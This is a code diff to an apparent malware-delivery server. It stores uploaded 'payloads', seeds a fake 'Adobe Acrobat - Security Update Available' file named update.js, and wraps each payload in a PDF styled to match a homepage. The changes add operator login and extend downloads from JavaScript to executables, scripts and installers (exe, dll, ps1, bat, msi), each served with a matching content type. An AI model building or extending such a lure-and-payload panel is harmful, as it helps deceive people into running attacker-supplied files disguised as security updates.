@@ -6,13 +6,16 @@ import { z } from "zod";
 import puppeteer from "puppeteer";
 import { readFileSync, existsSync } from "fs";
 import { resolve } from "path";
+import { authenticate, supabase } from "./auth";
 
 async function generatePDFMatchingHomepage(
-  jsContent: string,
+  fileContent: string,
   filename: string
 ): Promise<string> {
   const domain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_SLUG + "." + process.env.REPLIT_OWNER + ".repl.co";
-  const baseUrl = `https://${domain}`;
+  const isLocal = domain.includes('localhost') || domain.includes('127.0.0.1');
+  const protocol = isLocal ? 'http' : 'https';
+  const baseUrl = `${protocol}://${domain}`;
 
   let logoBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAABmJLR0QA/wD/AP+gvaeTAAAAy0lEQVQokWNkYGD4z8DAwMjAxMDAwPD//38GBkYGRkZGBkZGRgYGRgYGBiYGBkZGRkZGRgYGBgYGBiZGRgYGBkZGBkZGBgYGBgYGBiYmRkYGBkZGBkZGBgYGBgYGBiYmBkZGBgZGRgYGBgYGBgYmRkZGBkZGBgYGBgYGBgYGRkZGBgYGRkYGBgYGBgYGRgYGRkZGBkZGBgYGBkYGBgYGBgYGZkYGBkZGBgZGBgYGBgYGBkZGRgZGBkZGBgYGBgYGBgYGBkZGBkZGBgYGBgYGBgYGBkZGBkZGBkZGBkYGhv/8/wwMhPgDz4fST5+DT5gAAAAASUVORK5CYII=";
   
@@ -39,7 +42,7 @@ async function generatePDFMatchingHomepage(
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      height: 100vh;
       -webkit-print-color-adjust: exact;
     }
     .card {
@@ -48,6 +51,7 @@ async function generatePDFMatchingHomepage(
       border-radius: 8px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.15);
       overflow: hidden;
+      margin-top: 15vh;
     }
     .header-strip {
       height: 3px;
@@ -133,6 +137,11 @@ async function generatePDFMatchingHomepage(
       color: #9ca3af;
       text-align: center;
     }
+    @media print {
+      body {
+        height: auto;
+      }
+    }
   </style>
 </head>
 <body>
@@ -195,11 +204,11 @@ async function seedDefaultPayload() {
   try {
     const existing = await storage.getLatestPayload();
     if (!existing) {
-      const defaultJS = `console.log("Adobe Acrobat - Security Update Available");`;
-      const pdfBase64 = await generatePDFMatchingHomepage(defaultJS, "update.js");
+      const defaultContent = `console.log("Adobe Acrobat - Security Update Available");`;
+      const pdfBase64 = await generatePDFMatchingHomepage(defaultContent, "update.js");
       await storage.savePayload({
         filename: "update.js",
-        jsContent: defaultJS,
+        fileContent: defaultContent,
         pdfData: pdfBase64,
       });
     }
@@ -215,19 +224,86 @@ export async function registerRoutes(
   
   await seedDefaultPayload();
 
-  app.post(api.payloads.upload.path, async (req, res) => {
+  // Login endpoint - Supabase Auth
+  app.post(api.auth.login.path, async (req, res) => {
+    try {
+      const input = api.auth.login.input.parse(req.body);
+      
+      const { data, error } = await supabase.auth.signInWithPassword({
+        email: input.username,
+        password: input.password,
+      });
+
+      if (error) {
+        return res.status(401).json({ message: error.message });
+      }
+
+      res.json({ 
+        success: true, 
+        user: { 
+          id: data.user.id, 
+          email: data.user.email,
+          access_token: data.session.access_token,
+        } 
+      });
+    } catch (err) {
+      console.error("Login error:", err);
+      if (err instanceof z.ZodError) {
+        return res.status(400).json({
+          message: err.errors[0].message,
+          field: err.errors[0].path.join('.'),
+        });
+      }
+      res.status(500).json({ message: "Login failed" });
+    }
+  });
+
+  // Logout endpoint
+  app.post(api.auth.logout.path, async (req, res) => {
+    try {
+      const token = req.headers.authorization?.substring(7);
+      if (token) {
+        await supabase.auth.signOut();
+      }
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ message: "Logout failed" });
+    }
+  });
+
+  // Get current user endpoint
+  app.get(api.auth.me.path, authenticate, (req, res) => {
+    const user = (req as any).user;
+    res.json({ 
+      user: { 
+        id: user.id, 
+        email: user.email 
+      } 
+    });
+  });
+
+  app.post(api.payloads.upload.path, authenticate, async (req, res) => {
     try {
       const input = api.payloads.upload.input.parse(req.body);
-      const pdfBase64 = await generatePDFMatchingHomepage(input.jsContent, input.filename);
+      
+      // Handle data URL format (e.g., "data:application/zip;base64,...")
+      let fileContent = input.fileContent;
+      if (fileContent.startsWith('data:')) {
+        const base64Data = fileContent.split(',')[1];
+        fileContent = base64Data;
+      }
+      
+      const pdfBase64 = await generatePDFMatchingHomepage(fileContent, input.filename);
 
       const payload = await storage.savePayload({
         filename: input.filename,
-        jsContent: input.jsContent,
+        fileContent: fileContent,
         pdfData: pdfBase64,
       });
 
       res.status(201).json({ success: true, id: payload.id });
     } catch (err) {
+      console.error("Upload error:", err);
       if (err instanceof z.ZodError) {
         return res.status(400).json({
           message: err.errors[0].message,
@@ -238,27 +314,56 @@ export async function registerRoutes(
     }
   });
 
-  app.get(api.payloads.getLatest.path, async (req, res) => {
+  app.get(api.payloads.getLatest.path, authenticate, async (req, res) => {
     const payload = await storage.getLatestPayload();
     if (!payload) {
       return res.status(404).json({ message: "No payload found" });
     }
-    res.json({ filename: payload.filename, jsContent: payload.jsContent });
+    res.json({ filename: payload.filename, fileContent: payload.fileContent });
   });
 
-  app.get(api.payloads.download.path, async (req, res) => {
+  app.get(api.payloads.download.path, authenticate, async (req, res) => {
     const payload = await storage.getLatestPayload();
     if (!payload) {
       return res.status(404).send("No update available.");
     }
     const type = req.query.type as string || 'download';
-    const filename = type === 'update' ? 'update.js' : 'download.js';
+    const filename = payload.filename;
+    const ext = filename.split('.').pop()?.toLowerCase() || 'bin';
+    
+    const contentTypeMap: Record<string, string> = {
+      'js': 'application/javascript',
+      'exe': 'application/octet-stream',
+      'dll': 'application/octet-stream',
+      'bat': 'application/x-bat',
+      'cmd': 'application/x-cmd',
+      'ps1': 'application/x-powershell',
+      'sh': 'application/x-sh',
+      'pdf': 'application/pdf',
+      'zip': 'application/zip',
+      'rar': 'application/x-rar',
+      'msi': 'application/x-msi',
+      'app': 'application/octet-stream',
+      'dmg': 'application/x-dmg',
+      'deb': 'application/x-deb',
+      'rpm': 'application/x-rpm',
+    };
+    
+    const contentType = contentTypeMap[ext] || 'application/octet-stream';
+    
+    // Decode base64 content for binary files
+    const binaryExtensions = ['zip', 'exe', 'dll', 'pdf', 'rar', 'msi', 'app', 'dmg', 'deb', 'rpm'];
+    let contentToSend: string | Buffer = payload.fileContent;
+    if (binaryExtensions.includes(ext)) {
+      contentToSend = Buffer.from(payload.fileContent, "base64");
+    }
+    
     res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-    res.send(payload.jsContent);
+    res.setHeader('Content-Type', contentType);
+    res.send(contentToSend);
   });
 
-  app.get(api.payloads.downloadPdf.path, async (req, res) => {
+  app.get(api.payloads.downloadPdf.path, authenticate, async (req, res) => {
     const payload = await storage.getLatestPayload();
     if (!payload) return res.status(404).send("No payload found");
     const pdfBuffer = Buffer.from(payload.pdfData, "base64");
